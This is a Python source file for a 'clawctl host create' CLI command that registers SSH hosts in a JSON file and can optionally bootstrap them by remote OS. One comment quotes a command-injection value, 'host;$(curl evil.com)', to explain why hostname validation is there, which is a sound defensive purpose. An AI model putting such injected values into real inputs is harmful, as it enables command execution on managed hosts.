"""`clawctl host create <hostname>` — create a host record.

Plan §4 / §5:

- `--user U` (required) — SSH user
- `--port P` (default 22) — SSH port
- `--alias A` — display alias
- `--bootstrap` — additionally run the host bootstrap playbook
  (legacy `clm host init` equivalent)

Without `--bootstrap`, this just registers the host in `hosts.json`
(idempotent — re-running the same hostname is a no-op if data matches).

Bootstrap is delegated to the legacy `cli/host.py:init` helper for
this bundle because the bootstrap logic intertwines paramiko, host-key
acceptance, and the keypair lifecycle. Extracting that into core is
out of scope for #508; tracked for the bundle-5 cleanup.
"""

from __future__ import annotations

import getpass
from datetime import datetime, timezone
from typing import Optional

import typer

from clawrium.cli.clawctl._common import (
    require_flag,
    validate_alias,
    validate_hostname,
)
from clawrium.cli.output import emit_error, stream_action
from clawrium.core.hosts import (
    DuplicateHostError,
    HostsFileCorruptedError,
    add_host,
    get_host,
)


def create(
    hostname: str = typer.Argument(..., help="Hostname or IP of the new host."),
    user: Optional[str] = typer.Option(
        None, "--user", "-u", help="SSH user for the host (required)."
    ),
    port: int = typer.Option(22, "--port", "-p", min=1, max=65535, help="SSH port."),
    alias: Optional[str] = typer.Option(
        None, "--alias", "-a", help="Display alias for the host."
    ),
    bootstrap: bool = typer.Option(
        False, "--bootstrap", help="Also run the host bootstrap playbook."
    ),
) -> None:
    """Create a host record (optionally bootstrap remote)."""
    # ATX iter-1 B10: validate hostname + alias before they reach hosts.json
    # so a value like `host;$(curl evil.com)` cannot persist and be passed
    # to Ansible on every subsequent lifecycle op.
    validate_hostname(hostname)
    if alias is not None:
        validate_alias(alias)
    require_flag(user, flag="--user")
    final_user = user or getpass.getuser()

    try:
        existing = get_host(hostname) or (get_host(alias) if alias else None)
    except HostsFileCorruptedError as exc:
        emit_error(str(exc), hint="check ~/.config/clawrium/hosts.json")

    if existing:
        # Idempotent: same hostname + user → no-op success.
        if existing.get("hostname") == hostname and existing.get("user") == final_user:
            stream_action(
                resource=f"host/{alias or hostname}",
                message=f"already exists on {hostname}",
            )
            if bootstrap:
                _run_bootstrap(hostname, final_user)
            return
        emit_error(
            f"host {hostname!r} already registered with different settings",
            hint="clawctl host edit to modify, or clawctl host delete first",
        )

    now = datetime.now(timezone.utc).isoformat()
    record: dict = {
        "hostname": hostname,
        "key_id": hostname,
        "port": port,
        "user": final_user,
        "auth_method": "key",
        "hardware": {},
        "metadata": {"added_at": now, "last_seen": None, "labels": {}},
        "addresses": [
            {
                "address": hostname,
                "is_primary": True,
                "label": None,
                "added_at": now,
            }
        ],
        "agents": {},
    }
    if alias:
        record["alias"] = alias

    try:
        add_host(record)
    except DuplicateHostError as exc:
        emit_error(str(exc), hint="clawctl host delete to remove first")
    except HostsFileCorruptedError as exc:
        emit_error(str(exc), hint="check ~/.config/clawrium/hosts.json")

    display = alias or hostname
    stream_action(resource=f"host/{display}", message=f"created on {hostname}:{port}")

    if bootstrap:
        _run_bootstrap(hostname, final_user)


def _run_bootstrap(hostname: str, user: str) -> None:
    """Detect remote OS family, then dispatch to the per-OS bootstrap.

    Linux bootstrap is delegated to the legacy `cli/host.py:init` helper.
    Darwin bootstrap dispatches to `cli/host_macos.py:init_macos` once
    that module lands (issue #469, step 3). Until then, attempting a
    Mac bootstrap fails with a clear, actionable error.
    """
    from clawrium.cli.host_bootstrap import (
        OSDetectionError,
        detect_remote_os_family,
    )
    from clawrium.core.hosts import update_host

    try:
        os_family = detect_remote_os_family(hostname, user)
    except OSDetectionError as exc:
        emit_error(str(exc))
    except Exception as exc:  # paramiko / socket errors
        emit_error(
            f"could not reach {hostname} to detect OS family: {exc}",
            hint="verify SSH connectivity as the user passed to --user",
        )

    update_host(hostname, lambda h: {**h, "os_family": os_family})
    stream_action(
        resource=f"host/{hostname}",
        message=f"detected os_family={os_family}",
    )

    if os_family == "linux":
        try:
            from clawrium.cli.host import init as _legacy_init
        except ImportError as exc:
            emit_error(
                f"bootstrap unavailable: {exc}",
                hint="re-run without --bootstrap and bootstrap manually",
            )
        stream_action(resource=f"host/{hostname}", message="bootstrapping (linux)")
        _legacy_init(hostname=hostname, user=user)
        return

    if os_family == "darwin":
        try:
            from clawrium.cli.host_macos import init_macos as _mac_init
        except ImportError:
            emit_error(
                "macOS host bootstrap is not available in this build",
                hint=(
                    "this clawrium version was built without cli/host_macos.py; "
                    "upgrade to a release that includes issue #469 step 3"
                ),
            )
        stream_action(resource=f"host/{hostname}", message="bootstrapping (macos)")
        _mac_init(hostname=hostname, user=user)
        return

    # Unreachable: detect_remote_os_family raises on anything else.
    emit_error(f"unexpected os_family={os_family!r}")
